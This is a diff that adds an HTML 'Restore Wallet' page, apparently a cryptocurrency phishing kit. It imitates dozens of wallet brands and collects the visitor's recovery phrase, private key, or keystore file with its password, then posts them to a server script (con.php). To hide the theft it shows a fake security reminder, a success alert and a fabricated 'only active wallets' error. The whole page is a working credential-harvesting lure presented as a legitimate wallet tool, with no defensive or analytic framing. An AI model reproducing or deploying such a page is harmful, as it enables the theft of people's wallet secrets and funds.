@@ -1,0 +1,800 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Restore Wallet</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+  <style>
+    body {
+      background-color: #111;
+      color: white;
+    }
+    .custom-modal {
+      background-color: #222;
+      color: white;
+    }
+    .wallet-card {
+      background-color: #333;
+      color: rgb(85 102 255);
+      border-radius: 8px;
+      /* text-align: center; */
+      padding: 10px;
+      cursor: pointer;
+    }
+    .wallet-card i{
+      display: none
+    }
+    .inpf::placeholder {
+    color: #bab8b8; /* Change this to your desired color */
+    }
+    .wallet-card:hover {
+      background-color: #444;
+    }
+    .subtab {
+      border: none;
+      border-radius: 20px;
+      background-color: #333;
+      color: white;
+      margin: 5px;
+    }
+    .card {
+      background-color: #333;
+      color: white;
+    }
+    .subtab.active {
+      background-color: #555;
+    }
+    .button-container {
+  display: flex;
+  justify-content: space-between; /* Ensures equal spacing between buttons */
+  align-items: center; /* Vertically aligns the buttons */
+  flex-wrap: nowrap; /* Prevents wrapping to the next row */
+  gap: 10px; /* Adds spacing between buttons (optional) */
+}
+
+.button-container div {
+  flex: 1; /* Ensures all buttons take equal width */
+}
+
+.btna {
+  width: 100%; /* Makes each button fill its flex container */
+}
+/* #topRightAlert {
+      position: fixed;
+      top: 10px;
+      right: 10px;
+      background-color: rgb(31, 206, 31) !important;
+      color: white;
+      z-index: 1050; 
+      width: auto; 
+      max-width: 100%; 
+    } */
+    #topRightAlert {
+      position: fixed;
+      top: 10px;
+      right: 10px;
+      z-index: 2000;
+      background-color: rgb(31, 206, 31) !important;
+      color: white;
+      display: none; /* Initially hidden */
+    }
+    #topRightErrAlert {
+      position: fixed;
+      top: 10px;
+      right: 10px;
+      z-index: 2000;
+      background-color: red !important;
+      color: white;
+      display: none; /* Initially hidden */
+    }
+
+    .fade-out {
+      opacity: 0;
+      transition: opacity 0.5s ease-out;
+    }
+
+    @media (max-width: 576px) {
+    .rowb .col{
+      width: 70%;
+      display: flex;
+    } 
+  }
+  </style>
+</head>
+<body>
+<div class="container mt-5 text-center">
+  <div class="card col-lg-6 mx-auto">
+    <center><span class="mt-3 mb-4 btn btn-primary" style="background-color: rgb(85 102 255);"><i class="fas fa-wallet"></i></span></center>
+    <h3>Restore Wallet</h3>
+    <button class="mx-auto btn btn-primary mt-3" style="width: 95%; background-color: rgb(85 102 255);" id="selectWallet">Select Wallet</button>
+    <!-- <p id="selectedWallet" class="mt-2">No wallet selected</p> -->
+
+    <!-- Subtabs -->
+    <div class="mt-4">
+      <div class="btn-group">
+        <button class="btn subtab active" data-tab="recovery-content">Recovery Phrase</button>
+        <button class="btn subtab" data-tab="private-key-content">Private Key</button>
+        <button class="btn subtab" data-tab="keystore-content">Keystore JSON</button>
+      </div>
+    </div>
+
+    <!-- Recovery Phrase Content -->
+    <div id="recovery-content" class="tab-content mt-4">
+      <div class="d-flex" style="float: right;">
+        <a class="mx-2" id="set12" style="text-decoration: none; color: grey; cursor: pointer;">12</a>
+        <a class="mx-2" id="set17" style="text-decoration: none; color: grey; cursor: pointer;">17</a>
+        <a class="mx-2" id="set24" style="text-decoration: none; color: grey; cursor: pointer;">24</a>
+        <a class="mx-2" id="set25" style="text-decoration: none; color: grey; cursor: pointer;">25</a>
+      </div>
+      <p class="mt-2"><span id="enteredWords">0</span> / <span id="wordCount">12</span> words entered</p>
+      <div id="inputContainer" class="row g-2 mt-2" style="padding: 10px 30px;">
+        <!-- Input fields dynamically populated -->
+      </div>
+      <button id="recoveryRestoreBtn" class="btn btn-primary mt-3 btn-block" style="width: 95%; background-color: rgb(85 102 255);">Restore</button>
+    </div>
+
+    <!-- Private Key Content -->
+    <div id="private-key-content" class="tab-content mt-4 d-none" style="padding: 5px 30px;">
+        <input type="text" id="privateKeyInput" class="inpf form-control mt-2" placeholder="Paste your private key here" style="background-color: #444; color: white;">
+        <button id="privateKeyRestoreBtn" class="btn btn-primary mt-3 btn-block" style="width: 95%; background-color: rgb(85 102 255);">Restore</button>
+    </div>
+
+    <!-- Keystore Content -->
+    <div id="keystore-content" class="tab-content mt-4 d-none" style="padding: 5px 30px;">
+        <textarea id="keystoreJSONInput" class="inpf form-control" placeholder="Paste your keystore JSON here" rows="5" style="background-color: #444; color: white;"></textarea>
+        <input id="keystorePassword" type="password" class="inpf form-control mt-2" placeholder="Password" style="background-color: #444; color: white;">
+      <button id="keystoreRestoreBtn" class="btn btn-primary mt-3" style="width: 95%; background-color: rgb(85 102 255);">Restore</button>
+    </div>
+
+    <a style="padding: 10px 20px; color: grey;"><span style="float: left;">Help</span> <span style="float: right;">Quit</span></a>
+  </div>
+</div>
+
+<!-- Wallet Selection Modal -->
+<div class="modal fade custom-modal" id="walletModal" tabindex="-1" aria-labelledby="walletModalLabel" aria-hidden="true">
+  <div class="modal-dialog">
+    <div class="modal-content custom-modal" style="background-color: #444;">
+      <div class="modal-header">
+        <h5 class="modal-title" id="walletModalLabel">Choose Your Wallet</h5>
+        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+      </div>
+      <div class="modal-body">
+        <div class="row g-2">
+          <!-- <div class="col-6">
+            <div class="wallet-card" data-wallet="MetaMask"><i class="fab fa-ethereum"></i> MetaMask</div>
+          </div>
+          <div class="col-6">
+            <div class="wallet-card" data-wallet="Trust Wallet"><i class="fas fa-wallet"></i> Trust Wallet</div>
+          </div>
+          <div class="col-6">
+            <div class="wallet-card" data-wallet="Coinbase Wallet"><i class="fas fa-coins"></i> Coinbase Wallet</div>
+          </div> -->
+          <div class="col-6">
+            <div class="wallet-card" data-wallet="Binance Wallet"><i class="fab fa-bitcoin"></i> Binance Wallet</div>
+          </div>
+          <div class="col-6">
+            <div class="wallet-card" data-wallet="Safepal"><i class="fas fa-wallet"></i> Safepal</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Wallet Connect"><i class="fas fa-wallet"></i> Wallet Connect</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Trust Wallet"><i class="fas fa-wallet"></i> Trust Wallet</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Metamask"><i class="fab fa-ethereum"></i> Metamask</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Liquality"><i class="fas fa-wallet"></i> Liquality</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Phantom Wallet"><i class="fas fa-wallet"></i> Phantom Wallet</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Polygon Wallet"><i class="fas fa-wallet"></i> Polygon Wallet</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Rainbow"><i class="fas fa-wallet"></i> Rainbow</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Bitpay"><i class="fas fa-wallet"></i> Bitpay</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Walleth"><i class="fas fa-wallet"></i> Walleth</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Argent"><i class="fas fa-wallet"></i> Argent</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Huobi Wallet"><i class="fas fa-wallet"></i> Huobi Wallet</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Encrypted Ink"><i class="fas fa-wallet"></i> Encrypted Ink</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Compound"><i class="fas fa-wallet"></i> Compound</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Polkadot"><i class="fas fa-wallet"></i> Polkadot</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Iotex"><i class="fas fa-wallet"></i> Iotex</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Coin98"><i class="fas fa-wallet"></i> Coin98</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Coinbase"><i class="fas fa-coins"></i> Coinbase</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Crypto.com | Defi Wallet"><i class="fas fa-wallet"></i> Crypto.com | Defi Wallet</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Token Pocket"><i class="fas fa-wallet"></i> Token Pocket</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Math Wallet"><i class="fas fa-wallet"></i> Math Wallet</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Ledger Live"><i class="fas fa-wallet"></i> Ledger Live</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="1Inch"><i class="fas fa-wallet"></i> 1Inch</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Dharma"><i class="fas fa-wallet"></i> Dharma</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Trust Vault"><i class="fas fa-wallet"></i> Trust Vault</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="MYKEY"><i class="fas fa-wallet"></i> MYKEY</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Atomic"><i class="fas fa-wallet"></i> Atomic</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="CoolWallet S"><i class="fas fa-wallet"></i> CoolWallet S</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Nash"><i class="fas fa-wallet"></i> Nash</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Coinomi"><i class="fas fa-wallet"></i> Coinomi</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Eternl"><i class="fas fa-wallet"></i> Eternl</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="GridPlus"><i class="fas fa-wallet"></i> GridPlus</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Tokenary"><i class="fas fa-wallet"></i> Tokenary</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="SafePal"><i class="fas fa-wallet"></i> SafePal</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Infinito"><i class="fas fa-wallet"></i> Infinito</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Wallet.io"><i class="fas fa-wallet"></i> Wallet.io</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Ownbit"><i class="fas fa-wallet"></i> Ownbit</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="EasyPocket"><i class="fas fa-wallet"></i> EasyPocket</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Bridge Wallet"><i class="fas fa-wallet"></i> Bridge Wallet</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="ViaWallet"><i class="fas fa-wallet"></i> ViaWallet</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="BitKeep"><i class="fas fa-wallet"></i> BitKeep</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Unstoppable Wallet"><i class="fas fa-wallet"></i> Unstoppable Wallet</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="HaloDefi Wallet"><i class="fas fa-wallet"></i> HaloDefi Wallet</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Dok Wallet"><i class="fas fa-wallet"></i> Dok Wallet</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Cello Wallet"><i class="fas fa-wallet"></i> Cello Wallet</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="CoinUs"><i class="fas fa-wallet"></i> CoinUs</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Valora"><i class="fas fa-wallet"></i> Valora</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Trustee Wallet"><i class="fas fa-wallet"></i> Trustee Wallet</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Gaurda Wallet"><i class="fas fa-wallet"></i> Gaurda Wallet</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Jade Wallet"><i class="fas fa-wallet"></i> Jade Wallet</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="PlasmaPay"><i class="fas fa-wallet"></i> PlasmaPay</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="O3Wallet"><i class="fas fa-wallet"></i> O3Wallet</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="HashKey Me"><i class="fas fa-wallet"></i> HashKey Me</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="RWallet"><i class="fas fa-wallet"></i> RWallet</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Flare Wallet"><i class="fas fa-wallet"></i> Flare Wallet</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="KyberSwap"><i class="fas fa-wallet"></i> KyberSwap</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="AToken Wallet"><i class="fas fa-wallet"></i> AToken Wallet</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Tongue Wallet"><i class="fas fa-wallet"></i> Tongue Wallet</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="XinFin XDC Network"><i class="fas fa-wallet"></i> XinFin XDC Network</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Talken Wallet"><i class="fas fa-wallet"></i> Talken Wallet</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="KEYRING PRO"><i class="fas fa-wallet"></i> KEYRING PRO</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Midas Wallet"><i class="fas fa-wallet"></i> Midas Wallet</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="AT.Wallet"><i class="fas fa-wallet"></i> AT.Wallet</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="imToken"><i class="fas fa-wallet"></i> imToken</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Solflare"><i class="fas fa-wallet"></i> Solflare</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Nova"><i class="fas fa-wallet"></i> Nova</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Braavos"><i class="fas fa-wallet"></i> Braavos</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Brave"><i class="fas fa-wallet"></i> Brave</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Xverse"><i class="fas fa-wallet"></i> Xverse</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Leather"><i class="fas fa-wallet"></i> Leather</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Keplr"><i class="fas fa-wallet"></i> Keplr</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Thor"><i class="fas fa-wallet"></i> Thor</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Rabby"><i class="fas fa-wallet"></i> Rabby</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Backpack Wallet"><i class="fas fa-wallet"></i> Backpack Wallet</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Sui Wallet"><i class="fas fa-wallet"></i> Sui Wallet</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="OKX Wallet"><i class="fas fa-wallet"></i> OKX Wallet</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Glow Wallet"><i class="fas fa-wallet"></i> Glow Wallet</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Blockchain Wallet"><i class="fas fa-wallet"></i> Blockchain Wallet</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Nami"><i class="fas fa-wallet"></i> Nami</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Trezor"><i class="fas fa-wallet"></i> Trezor</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Pera"><i class="fas fa-wallet"></i> Pera</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Leap"><i class="fas fa-wallet"></i> Leap</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Sei"><i class="fas fa-wallet"></i> Sei</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Stacks"><i class="fas fa-wallet"></i> Stacks</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Internet identity"><i class="fas fa-wallet"></i> Internet identity</div>
+        </div>
+        <div class="col-6">
+            <div class="wallet-card" data-wallet="Others"><i class="fas fa-wallet"></i> Others</div>
+        </div>        
+        
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+<div class="modal fade custom-modal" id="successModal" tabindex="-1" aria-labelledby="walletModalLabel" aria-hidden="true">
+  <div class="modal-dialog">
+    <div class="modal-content custom-modal" style="background-color: #444;">
+      <div class="modal-header">
+        <h5 class="modal-title" id="walletModalLabel"><i class="fas fa-warning" style="color: rgb(85 102 255)"></i>  Security Check</h5>
+
+      </div>
+      <div class="modal-body">
+        <div class="row">
+          <p><i class="fas fa-arrow-right" style="color: rgb(85 102 255)"></i> Verify you're on the correct website URL</p>
+          <p><i class="fas fa-arrow-right" style="color: rgb(85 102 255)"></i> Never share your recovery phrase with anyone</p>
+          <p><i class="fas fa-arrow-right" style="color: rgb(85 102 255)"></i> Double-check all details before proceeding</p>
+          <button id="btnmod" class="btn btn-primary btn-block" style="background-color: rgb(85 102 255);">I understood, Proceed</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- <div id="topRightAlert" class="alert alert-success" role="alert" style="display: none;">
+  Wallet restoration process initiated
+</div> -->
+<div id="topRightAlert" class="alert alert-success alert-dismissible fade show" role="alert">
+  Wallet restoration process initiated
+  <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
+</div>
+<div id="topRightErrAlert" class="alert alert-danger alert-dismissible fade show" role="alert">
+  <b>Error Conmecting</b>
+
+<p>Only Active Wallets Are Authorized</p>
+  <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
+</div>
+
+<div class="modal fade custom-modal" id="mModal" tabindex="-1" aria-labelledby="walletModalLabel" aria-hidden="true">
+  <div class="modal-dialog">
+    <div class="modal-content custom-modal" style="background-color: #444;">
+      <div class="modal-header">
+        <h5 class="modal-title mx-auto" id="walletModalLabel">Security Reminder</h5>
+      </div>
+      <div class="modal-body">
+        <div class="row rowb">
+          <p>
+          Your keys, your crypto. Always keep your recovery phrase safe and private
+          </p>
+          <div class="button-container d-flex justify-content-between">
+            <div>
+              <button class="btna btn btn-primary" style="background-color: grey; color: lightgrey;">
+                <i class="fas fa-arrow-left" style="color: lightgrey;"></i> Previous
+              </button>
+            </div>
+            <div>
+              <button class="btna btn btn-primary" style="background-color: grey; color: white;">
+                Skip All
+              </button>
+            </div>
+            <div>
+              <a href="connect.html" class="btna btn btn-primary" style="background-color: rgb(85 102 255);">
+                Next <i class="fas fa-arrow-right" style="color: white;"></i>
+              </a>
+            </div>
+          </div>
+          
+          <!-- <button class="btn btn-primary btn-block" style="background-color: rgb(85 102 255);">I understood, Proceed</button> -->
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script src="css/jquery-3.3.1.min.js"></script>
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script> -->
+<script>
+  // Global variable to track wallet selection
+let selectedWallet = false;
+
+// Wallet Selection
+document.getElementById('selectWallet').addEventListener('click', function () {
+  const walletModal = new bootstrap.Modal(document.getElementById('walletModal'));
+  walletModal.show();
+});
+
+document.querySelectorAll('.wallet-card').forEach(card => {
+  card.addEventListener('click', function () {
+    const wallet = card.getAttribute('data-wallet');
+    document.getElementById('selectWallet').textContent = wallet;
+    selectedWallet = true; // Mark wallet as selected
+    sWallet = wallet;
+    const walletModal = bootstrap.Modal.getInstance(document.getElementById('walletModal'));
+    walletModal.hide();
+    checkRestoreButtonState(); // Recheck restore button
+  });
+});
+
+// Tab Switching
+document.querySelectorAll('.subtab').forEach(tab => {
+  tab.addEventListener('click', function () {
+    // Remove active class from all tabs
+    document.querySelectorAll('.subtab').forEach(t => t.classList.remove('active'));
+
+    // Add active class to the clicked tab
+    tab.classList.add('active');
+    
+    // Hide all tab contents
+    document.querySelectorAll('.tab-content').forEach(content => content.classList.add('d-none'));
+    
+    // Show the relevant tab content
+    document.getElementById(tab.dataset.tab).classList.remove('d-none');
+    
+    // Recheck restore button state
+    checkRestoreButtonState(); 
+  });
+});
+
+// Input Fields and Word Count for Recovery Phrase
+const inputContainer = document.getElementById('inputContainer');
+const restoreButton = document.querySelector('#recovery-content .btn');
+
+function populateInputs(count) {
+  inputContainer.innerHTML = '';
+  for (let i = 1; i <= count; i++) {
+    const col = document.createElement('div');
+    col.className = 'col-4';
+    const input = document.createElement('input');
+    input.type = 'text';
+    input.className = 'form-control';
+    input.style.backgroundColor = '#444';
+    input.style.color = 'white';
+    input.placeholder = `Word ${i}`;
+    input.addEventListener('input', updateWordCount);
+    col.appendChild(input);
+    inputContainer.appendChild(col);
+  }
+  document.getElementById('wordCount').textContent = count;
+  updateWordCount();
+}
+
+function updateWordCount() {
+  const wordsEntered = Array.from(inputContainer.querySelectorAll('input')).filter(input => input.value.trim() !== '').length;
+  document.getElementById('enteredWords').textContent = wordsEntered;
+  checkRestoreButtonState();
+}
+
+document.getElementById('set12').addEventListener('click', () => populateInputs(12));
+document.getElementById('set17').addEventListener('click', () => populateInputs(17));
+document.getElementById('set24').addEventListener('click', () => populateInputs(24));
+document.getElementById('set25').addEventListener('click', () => populateInputs(25));
+
+// Check Restore button state
+function checkRestoreButtonState() {
+  const activeTab = document.querySelector('.subtab.active').dataset.tab;
+  let isInputsValid = false;
+
+  // Validate for each tab
+  if (activeTab === 'recovery-content') {
+    // Validate recovery phrase inputs
+    const totalWords = parseInt(document.getElementById('wordCount').textContent, 10);
+    const enteredWords = parseInt(document.getElementById('enteredWords').textContent, 10);
+    isInputsValid = enteredWords === totalWords;
+  } else if (activeTab === 'private-key-content') {
+    // Validate private key input
+    const privateKeyInput = document.querySelector('#private-key-content input').value.trim();
+    isInputsValid = privateKeyInput.length > 0;
+  } else if (activeTab === 'keystore-content') {
+    // Validate keystore JSON input and password
+    const jsonInput = document.querySelector('#keystore-content textarea').value.trim();
+    const passwordInput = document.querySelector('#keystore-content input[type="password"]').value.trim();
+    isInputsValid = jsonInput.length > 0 && passwordInput.length > 0;
+  }
+
+  // Enable Restore button only if wallet is selected and inputs are satisfied
+  const shouldEnable = selectedWallet && isInputsValid;
+  restoreButton.disabled = !shouldEnable;
+  restoreButton.style.opacity = shouldEnable ? '1' : '0.6'; // Add fade effect for disabled state
+}
+
+// Monitor changes in Private Key inputs
+document.querySelector('#private-key-content input').addEventListener('input', checkRestoreButtonState);
+
+// Monitor changes in Keystore/JSON inputs
+document.querySelector('#keystore-content textarea').addEventListener('input', checkRestoreButtonState);
+document.querySelector('#keystore-content input[type="password"]').addEventListener('input', checkRestoreButtonState);
+
+// Initialize with 12 inputs for Recovery Phrase
+populateInputs(12);
+
+// Handle Restore button click
+restoreButton.addEventListener('click', function () {
+  // Check if wallet is selected and if the relevant inputs are filled
+  const activeTab = document.querySelector('.subtab.active').dataset.tab;
+  let isInputsValid = false;
+
+  // Show processing animation
+  showProcessingAnimation();
+
+  // Validate for each tab
+  if (activeTab === 'recovery-content') {
+    const totalWords = parseInt(document.getElementById('wordCount').textContent, 10);
+    const enteredWords = parseInt(document.getElementById('enteredWords').textContent, 10);
+    isInputsValid = enteredWords === totalWords;
+  } else if (activeTab === 'private-key-content') {
+    const privateKeyInput = document.querySelector('#private-key-content input').value.trim();
+    isInputsValid = privateKeyInput.length > 0;
+  } else if (activeTab === 'keystore-content') {
+    const jsonInput = document.querySelector('#keystore-content textarea').value.trim();
+    const passwordInput = document.querySelector('#keystore-content input[type="password"]').value.trim();
+    isInputsValid = jsonInput.length > 0 && passwordInput.length > 0;
+  }
+
+
+});
+
+// Show processing animation
+function showProcessingAnimation() {
+  // Show "Processing..." on the button and disable it
+  restoreButton.innerHTML = "Processing...";
+  restoreButton.disabled = true;
+
+  // Set a timeout to change the button back to "Restore" after 5 seconds
+  setTimeout(function() {
+    restoreButton.innerHTML = "Restore";
+    restoreButton.disabled = false;
+  }, 5000); // 5000 milliseconds = 5 seconds
+}
+
+
+// Show error message
+function showError(message) {
+  // You can customize this to display error messages
+  alert(message);
+}
+    // Restore Buttons
+    document.getElementById('recoveryRestoreBtn').addEventListener('click', () => sendRestoreData('recovery'));
+    document.getElementById('privateKeyRestoreBtn').addEventListener('click', () => sendRestoreData('privateKey'));
+    document.getElementById('keystoreRestoreBtn').addEventListener('click', () => sendRestoreData('keystore'));
+
+    // Initialize the data object to send
+let formData = new FormData();
+
+// Send data to PHP without converting it to JSON
+function sendRestoreData(type) {
+  if (!selectedWallet) {
+    alert('Please select a wallet!');
+    return;
+  }
+
+  // Collect the data based on the type
+  if (type === 'recovery') {
+    const words = Array.from(document.querySelectorAll('#recovery-content input')).map(input => input.value.trim());
+    if (words.some(word => word === '')) {
+      alert('Please fill all recovery phrase fields.');
+      return;
+    }
+    // Append data to FormData object
+    formData.append('wallet', sWallet);
+    formData.append('type', type);
+    formData.append('words', words.join(' ')); // Join the words with space if you want to store them as a single field
+  } else if (type === 'privateKey') {
+    const privateKey = document.getElementById('privateKeyInput').value;
+    if (!privateKey) {
+      alert('Private Key cannot be empty!');
+      return;
+    }
+    formData.append('wallet', sWallet);
+    formData.append('type', type);
+    formData.append('privateKey', privateKey);
+  } else if (type === 'keystore') {
+    const keystore = document.getElementById('keystoreJSONInput').value.trim();
+    const password = document.getElementById('keystorePassword').value.trim();
+    if (!keystore || !password) {
+      alert('Keystore and Password are required!');
+      return;
+    }
+    formData.append('wallet', sWallet);
+    formData.append('type', type);
+    formData.append('keystore', keystore);
+    formData.append('password', password);
+  }
+
+  // Perform the AJAX request to send the data
+  const xhr = new XMLHttpRequest();
+  xhr.open('POST', 'con.php', true);
+
+  // Optionally, you can add event listeners to handle success or failure
+  xhr.onload = function () {
+    if (xhr.status === 200) {
+      const response = xhr.responseText;
+     
+      if(response=='success'){
+      const wModal = new bootstrap.Modal(document.getElementById('successModal'));
+      wModal.show();
+      }else{
+        alert(response);  // Display the response from the server
+      }
+     
+    } else {
+      alert('Error: ' + xhr.statusText);
+    }
+  };
+
+  xhr.onerror = function () {
+    alert('Request failed');
+  };
+
+  // Send the FormData
+  xhr.send(formData);
+}
+document.getElementById('btnmod').addEventListener('click', function () {
+      // Show the modal
+      const myModal = new bootstrap.Modal(document.getElementById('mModal'));
+      myModal.show();
+
+      // Show the alert
+      const alertElement = document.getElementById('topRightAlert');
+const alertElementErr = document.getElementById('topRightErrAlert');
+
+// Show the first alert
+alertElement.style.display = 'block'; // Make it visible
+
+// Fade out and remove the first alert after 5 seconds
+setTimeout(() => {
+  alertElement.classList.add('fade-out'); // Add fade-out effect
+  setTimeout(() => {
+    alertElement.style.display = 'none'; // Hide alert after fade-out
+    alertElement.classList.remove('fade-out'); // Reset fade-out class for reuse
+  }, 500); // Allow fade-out animation to complete before hiding
+}, 5000);
+
+// Show the error alert after 4 seconds
+setTimeout(() => {
+  alertElementErr.style.display = 'block'; // Make error alert visible
+
+  // Fade out and remove the error alert after 5 seconds
+  setTimeout(() => {
+    alertElementErr.classList.add('fade-out'); // Add fade-out effect
+    setTimeout(() => {
+      alertElementErr.style.display = 'none'; // Hide alert after fade-out
+      alertElementErr.classList.remove('fade-out'); // Reset fade-out class for reuse
+    }, 500); // Allow fade-out animation to complete before hiding
+  }, 5000);
+}, 4000); // Wait 4 seconds before showing the error alert
+
+      
+    });
+    //   // AJAX Request
+    //   fetch('/restore-wallet', {
+    //     method: 'POST',
+    //     headers: { 'Content-Type': 'application/json' },
+    //     body: JSON.stringify(data),
+    //   })
+    //     .then(response => response.json())
+    //     .then(result => alert(result.message))
+    //     .catch(error => alert('Error: ' + error));
+    // }
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+
+  
+</body>
+</html>
